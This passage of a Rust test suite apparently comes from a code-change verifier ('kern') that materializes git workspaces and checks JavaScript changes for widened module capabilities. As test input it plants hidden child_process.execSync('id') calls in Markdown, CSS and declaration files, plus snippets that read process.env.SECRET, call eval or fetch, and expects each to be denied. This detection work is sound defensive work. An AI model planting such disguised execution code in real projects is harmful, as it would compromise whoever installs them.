    sh(&repo, &["commit", "-qm", "base"]);
    let base = git::read_commit(&repo, &sh(&repo, &["rev-parse", "HEAD"]), 65536, 1048576).unwrap();
    assert_eq!((base["bin/cli.js"].mode.as_str(), base["src/tool.js"].mode.as_str()), ("100755", "100755"));
    let ws = t.join("ws");
    git::materialize(Some(&repo), &base, &ws, None).unwrap();
    for (p, c) in [("node_modules/installed/index.js", "x"), ("test/fixtures/node_modules/dep/extra.js", "x"), (".git/HEAD", "x")] {
        std::fs::create_dir_all(ws.join(p).parent().unwrap()).unwrap();
        std::fs::write(ws.join(p), c).unwrap();
    }
    let policy = contract(&policy_value()).unwrap();
    let read = kern::local::read_workspace(&ws, &base, 65536, 1048576).unwrap();
    assert_eq!(git::changes(&base, &read, &policy).unwrap()["files"], json!([]), "an untouched workspace must read back as no change");
    std::fs::remove_file(ws.join("src/tool.js")).unwrap();
    std::fs::write(ws.join("src/tool.js"), "module.exports = 3;\n").unwrap();
    let edited = kern::local::read_workspace(&ws, &base, 65536, 1048576).unwrap();
    assert_eq!(edited["src/tool.js"].mode, "100755");
    assert_eq!(git::changes(&base, &edited, &policy).unwrap()["files"], json!([{ "path": "src/tool.js", "operation": "modify" }]));
}

#[test]
fn workspace_read_back_keeps_unchanged_large_assets_opaque() {
    let t = Temp::new();
    let repo = t.join("repo");
    sh(&t.0, &["init", "-q", "repo"]);
    std::fs::create_dir_all(repo.join("src")).unwrap();
    std::fs::write(repo.join("logo.bin"), vec![7u8; 2 * 1048576]).unwrap();
    std::fs::write(repo.join("src/a.js"), "module.exports = 1;\n").unwrap();
    sh(&repo, &["add", "-A"]);
    sh(&repo, &["commit", "-qm", "base"]);
    let base = git::read_commit(&repo, &sh(&repo, &["rev-parse", "HEAD"]), 65536, 1048576).unwrap();
    let ws = t.join("ws");
    git::materialize(Some(&repo), &base, &ws, None).unwrap();
    let policy = contract(&policy_value()).unwrap();
    let read = kern::local::read_workspace(&ws, &base, 65536, 1048576).unwrap();
    assert!(read["logo.bin"].bytes.is_none() && read["logo.bin"].oid == base["logo.bin"].oid);
    assert_eq!(git::changes(&base, &read, &policy).unwrap()["files"], json!([]));
    std::fs::remove_file(ws.join("logo.bin")).unwrap();
    std::fs::write(ws.join("logo.bin"), vec![8u8; 2 * 1048576]).unwrap();
    denied(kern::local::read_workspace(&ws, &base, 65536, 1048576), "byte limits");
}

#[test]
fn capability_check_analyzes_data_files_that_node_would_execute() {
    let base = files(&[("src/a.js", "module.exports = 1;\n"), ("src/notes.md", "# Notes\n")]);
    let policy = contract(&policy_value()).unwrap();
    let none = std::collections::BTreeMap::new();
    let check = |c: &Files| { let changed = git::changes(&base, c, &policy).unwrap(); capability::check(&base, c, &changed, &none) };
    for payload in ["p.txt", "p.md", "p.css", "p.html", "p.d.ts", "notes.md"] {
        let mut c = base.clone();
        c.insert(format!("src/{payload}"), file("require('child_process').execSync('id');\n"));
        c.insert("src/a.js".into(), file(&format!("require('./{payload}');\nmodule.exports = 1;\n")));
        denied(check(&c), "widens module capabilities");
    }
    let mut c = base.clone();
    c.insert("src/p.d.ts".into(), file("declare const x: number;\nrequire('child_process').execSync('id');\n"));
    c.insert("src/a.js".into(), file("require('./p.d');\nmodule.exports = 1;\n"));
    denied(check(&c), "widens module capabilities");
    for spec in ["./p.d.ts", "./P.D.TS", "./p.d.mts?v=1", "./p.d.cts#x", "./p%2ed.ts"] { assert!(caps("src/a.mjs", &format!("import '{spec}';")).iter().any(|c| c.starts_with("escape:")), "{spec}"); }
    let mut docs = base.clone();
    docs.insert("src/notes.md".into(), file("# Notes\n\nCall `fetch` with care.\n"));
    docs.insert("src/site.css".into(), file("a { color: red; }\n"));
    docs.insert("src/types.d.ts".into(), file("import { Readable } from 'node:stream';\nexport declare function add(a: number, b: number): number;\nexport function sub(a: number, b: number): number;\nexport interface S { r: Readable }\n"));
    docs.insert("src/a.js".into(), file("/** @type {import('./types.d.ts').S} */\nmodule.exports = 1;\n"));
    check(&docs).unwrap();
}

#[test]
fn capability_directory_baseline_ignores_declaration_files() {
    let base = files(&[("src/a.js", "module.exports = 1;\n"), ("src/types.d.ts", "import { ChildProcess } from 'child_process';\nexport declare function run(): ChildProcess;\n")]);
    let policy = contract(&policy_value()).unwrap();
    let mut c = base.clone();
    c.insert("src/evil.js".into(), file("require('child_process').exec('id');\n"));
    let changed = git::changes(&base, &c, &policy).unwrap();
    denied(capability::check(&base, &c, &changed, &std::collections::BTreeMap::new()), "widens module capabilities");
}

#[test]
fn capability_footprint_sees_aliased_process_module_and_global_objects() {
    for (code, cap) in [
        ("const p = process; p.env.SECRET;", "process:dynamic"), ("const { env } = process;", "process:dynamic"),
        ("const m = module; m.require('child_process');", "module:dynamic"), ("const g = globalThis; g.eval('1');", "global:dynamic"),
        ("(function (w) { w.fetch('https://x.invalid'); })(window);", "global:dynamic"),
    ] { assert!(caps("src/a.js", code).contains(&cap.to_string()), "{code} missing {cap}"); }
    assert_eq!(caps("src/a.js", "if (typeof process !== 'undefined' && typeof window === 'undefined' && typeof module === 'object' && typeof require === 'function') {}"), Vec::<String>::new());
}

#[test]
fn capability_footprint_treats_relative_imports_into_node_modules_as_packages() {
    assert_eq!(caps("src/a.js", "require('../node_modules/execa');\nimport('./node_modules/@scope/pkg/index.js');\nrequire('../Node_Modules/x/y');"), vec!["package:@scope/pkg", "package:execa", "package:x"]);
}

#[test]
fn pr_attestation_survives_crlf_bodies_from_web_edits() {
    let f = fixture();
    let d = promote::Decision { repository: "acme/project".into(), branch: format!("kern/fix-addition/{}", f.run_id), base: f.base.clone(), commit: f.commit.clone(), run_id: f.run_id.clone(), attestation: Value::Null };
    let body = promote::pr_body("fix-addition", &d, &f.envelope, None).unwrap();
    assert_eq!(promote::extract_attestation(&body.replace('\n', "\r\n")).unwrap(), f.envelope);
}

#[test]
fn operator_check_files_are_verifier_side_unix_paths_on_every_platform() {
    let mut v = operator_value(&["external"]);
    v["checks"][0]["file"] = json!("/operator/checks/addition.json");
    operator(&v).unwrap();
    v["checks"][0]["file"] = json!("checks/addition.json");
    denied(operator(&v), "absolute file");
}

#[cfg(unix)]
#[test]
fn materialized_executables_keep_their_execute_bit() {
    use std::os::unix::fs::PermissionsExt;
    let t = Temp::new();
    let repo = t.join("repo");
    sh(&t.0, &["init", "-q", "repo"]);
    std::fs::create_dir_all(repo.join("bin")).unwrap();
    std::fs::write(repo.join("bin/cli.js"), "#!/usr/bin/env node\n").unwrap();
    std::fs::write(repo.join("bin/big"), vec![b'x'; 2 * 1048576]).unwrap();
    std::fs::write(repo.join("README.md"), "x\n").unwrap();
    sh(&repo, &["add", "-A"]);
    sh(&repo, &["update-index", "--chmod=+x", "bin/cli.js", "bin/big"]);
    sh(&repo, &["commit", "-qm", "base"]);
    let base = git::read_commit(&repo, &sh(&repo, &["rev-parse", "HEAD"]), 65536, 1048576).unwrap();
    git::materialize(Some(&repo), &base, &t.join("out"), None).unwrap();
    let mode = |p: &str| std::fs::metadata(t.join("out").join(p)).unwrap().permissions().mode() & 0o777;
    assert_eq!((mode("bin/cli.js"), mode("bin/big"), mode("README.md")), (0o555, 0o555, 0o444));
}

#[test]
fn run_returns_at_its_deadline_even_if_a_background_process_holds_the_output() {
    let (exe, args): (PathBuf, Vec<String>) = if cfg!(windows) {
        (PathBuf::from(r"C:\Windows\System32\cmd.exe"), vec!["/c".into(), "start /b ping -n 30 127.0.0.1".into()])
    } else {
        (PathBuf::from("/bin/sh"), vec!["-c".into(), "sleep 30 &".into()])
    };
    let started = std::time::Instant::now();
    let r = run(&exe, &args, Run { timeout: std::time::Duration::from_secs(2), ..Default::default() });
    assert!(started.elapsed() < std::time::Duration::from_secs(10), "run() must honour its timeout, took {:?}", started.elapsed());
    denied(r, "background process");
}
